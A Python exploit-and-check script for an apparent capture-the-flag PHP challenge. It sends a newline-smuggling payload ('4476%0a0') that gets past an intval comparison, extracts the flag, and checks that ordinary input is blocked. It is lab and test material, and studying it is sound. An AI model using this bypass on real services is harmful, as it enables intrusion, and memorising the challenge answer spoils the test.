#!/usr/bin/env python3
"""PHP intval bypass challenge exploit.

Tests that the service returns the flag when given the correct bypass payload.
The challenge expects: ?num=4476%0a0

Returns 0 if attack succeeds (defense failed), non-zero if blocked (defense holds).
"""
import argparse
import urllib.request
import urllib.parse
import sys


def health_check(base):
    """Check service is up and index page loads."""
    try:
        body = urllib.request.urlopen(f'{base}/', timeout=10).read().decode()
        if 'highlight_file' in body:
            print('[health] OK - source code displayed')
            return True
        else:
            print(f'[health] WARNING: unexpected response ({len(body)} bytes)')
            return False
    except Exception as e:
        print(f'[health] FAIL: {e}')
        return False


def exploit(base):
    """Send the bypass payload: num=4476%0a0"""
    payload = '4476\n0'
    url = f'{base}/?num={urllib.parse.quote(payload)}'
    try:
        body = urllib.request.urlopen(url, timeout=10).read().decode()
        if 'flag{' in body:
            # Extract the flag
            start = body.find('flag{')
            end = body.find('}', start) + 1
            flag = body[start:end]
            print(f'[exploit] SUCCESS - Flag captured: {flag}')
            return True
        else:
            print(f'[exploit] FAIL - No flag in response')
            print(f'[exploit] Response snippet: {body[:200]}')
            return False
    except Exception as e:
        print(f'[exploit] ERROR: {e}')
        return False


def test_blocked(base):
    """Test that random input does NOT return the flag (defense check)."""
    url = f'{base}/?num=12345'
    try:
        body = urllib.request.urlopen(url, timeout=10).read().decode()
        if 'flag{' in body:
            print('[blocked] FAIL - Flag exposed with invalid input')
            return False
        print('[blocked] OK - Invalid input correctly blocked')
        return True
    except Exception as e:
        print(f'[blocked] ERROR: {e}')
        return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='PHP intval bypass exploit')
    parser.add_argument('--target', default='http://127.0.0.1:80', help='Target base URL')
    parser.add_argument('--check', action='store_true', help='Run health check only')
    args = parser.parse_args()

    base = args.target.rstrip('/')

    if not health_check(base):
        sys.exit(1)

    if args.check:
        sys.exit(0)

    # Test that random input is blocked (defense should hold)
    if not test_blocked(base):
        sys.exit(0)  # Already broken, nothing to exploit

    # Attempt exploit
    if exploit(base):
        sys.exit(0)  # Attack succeeded (defense failed)
    else:
        sys.exit(1)  # Attack blocked (defense holds)
